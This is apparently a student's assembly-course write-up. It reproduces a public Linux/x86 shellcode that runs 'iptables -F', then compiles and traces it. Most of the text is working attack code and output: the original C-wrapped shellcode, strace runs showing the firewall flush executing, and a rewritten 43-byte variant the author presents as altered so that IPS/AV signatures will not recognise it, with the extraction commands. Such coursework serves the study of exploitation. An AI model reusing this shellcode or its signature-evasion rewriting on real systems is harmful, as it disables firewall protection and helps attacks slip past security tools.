Shellcode source: http://shell-storm.org/shellcode/files/shellcode-368.php
Description: Linux/x86 - iptables --flush - 43 bytes by Hamza Megahed

This shellcode comes as a C file;
--begins--
/*
 * 06/03/2003 
 * 
 * ( 45 bytes ) to flush iptables.
 *
 * _execve(/sbin/iptables -F)  by UnboundeD
 * greetz to s0t4ipv6.
 *
 */

char shellcode[] =

"\x31\xd2"                      // xorl         %edx,%edx
"\x52"                          // pushl        %edx
"\x66\x68\x2d\x46"              // pushw        $0x462d
"\x89\xe6"                      // movl         %esp,%esi
"\x52"                          // pushl        %edx
"\x68\x62\x6c\x65\x73"          // pushl        $0x73656c62
"\x68\x69\x70\x74\x61"          // pushl        $0x61747069
"\x89\xe7"                      // movl         %esp,%edi
"\x68\x62\x69\x6e\x2f"          // pushl        $0x2f6e6962
"\x68\x2f\x2f\x2f\x73"          // pushl        $0x732f2f2f
"\x89\xe3"                      // movl         %esp,%ebx
"\x52"                          // pushl        %edx
"\x56"                          // pushl        %esi
"\x57"                          // pushl        %edi
"\x89\xe1"                      // movl         %esp,%ecx
"\x31\xc0"                      // xorl         %eax,%eax
"\xb0\x0b"                      // movb         $0xb,%al
"\xcd\x80"                      // int          $0x80
;

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(shellcode));
        (*ret) = (int)shellcode;
}
--ends--

For this third example, let's straight-up try and optimise it. 
Let's try and run it first...

paul@SLAE001:~$ gcc flush-iptables.c -o flush-iptables -m32 -fno-stack-protector -z execstack
flush-iptables.c: In function ‘main’:
flush-iptables.c:36:9: warning: incompatible implicit declaration of built-in function ‘printf’ [enabled by default]
flush-iptables.c:36:40: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
paul@SLAE001:~$ strace ./flush-iptables 
execve("./flush-iptables", ["./flush-iptables"], [/* 21 vars */]) = 0
...
write(1, "Shellcode lenght=45\n", 20Shellcode lenght=45
)   = 20
exit_group(-1081789164)                 = ?
paul@SLAE001:~$ 


Okay, getting some errors running it so just dropped it into a known-working C program wrapper with the includes, etc.

paul@SLAE001:~$ cat shellcode.c 
#include<stdio.h>
#include<string.h>

//compile with:  gcc shellcode.c -o shellcode -m32 -fno-stack-protector -z execstack  


unsigned char code[] = \
"\x31\xd2\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x89\xe7\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x52\x56\x57\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
paul@SLAE001:~$ gcc shellcode.c -o shellcode -m32 -fno-stack-protector -z execstack
paul@SLAE001:~$ strace ./shellcode 
execve("./shellcode", ["./shellcode"], [/* 21 vars */]) = 0
...
write(1, "Shellcode Length:  45\n", 22Shellcode Length:  45
) = 22
execve("///sbin/iptables", ["iptables", "-F"], [/* 0 vars */]) = 0
brk(0)                                  = 0x9804000
...
exit_group(3)                           = ?
paul@SLAE001:~$ 


Okay, this works, lets have a tinker with the shellcode and try and optimise it somewhat - the main purpose being to change the instructions so that the pattern of the file is not recognised by IPS/AV as being in their signature databases.

I came up with the following alternative version of the shellcode;

global _start
section .text
_start:
    xor eax,eax
    mov al,0xb
    cdq
    ;xor edx,edx
    push edx
    push word 0x462d        ; -F
    mov esi,esp
    push edx
    push dword 0x73656c62   ; bles
    push dword 0x61747069   ; ipta
    mov edi,esp
    push dword 0x2f6e6962   ; bin/
    push word 0x732f        ; /s
    mov ebx,esp
    push edx
    push esi
    push edi
    mov ecx,esp
    ;xor eax,eax
    ;mov al,0xb
    int 0x80


Let's test it...

paul@SLAE001:~$ ./compile.sh flush-iptables
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
paul@SLAE001:~$ strace ./flush-iptables 
execve("./flush-iptables", ["./flush-iptables"], [/* 21 vars */]) = 0
execve("/sbin/iptables", ["iptables", "-F"], [/* 0 vars */]) = 0
...
exit_group(3)                           = ?
paul@SLAE001:~$ objdump -d ./flush-iptables|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x0b\x99\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x89\xe7\x68\x62\x69\x6e\x2f\x66\x68\x2f\x73\x89\xe3\x52\x56\x57\x89\xe1\xcd\x80"
paul@SLAE001:~$ perl -e 'print "\x31\xc0\xb0\x0b\x99\x52\x66\x68\x2d\x46\x89\xe6\x52\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x89\xe7\x68\x62\x69\x6e\x2f\x66\x68\x2f\x73\x89\xe3\x52\x56\x57\x89\xe1\xcd\x80";' | wc -c
43
paul@SLAE001:~$ 


Nice...!  In the new, altered form it works.

Also, I shaved two bytes off the shellcode - I'll earn the bonus points for that :-)


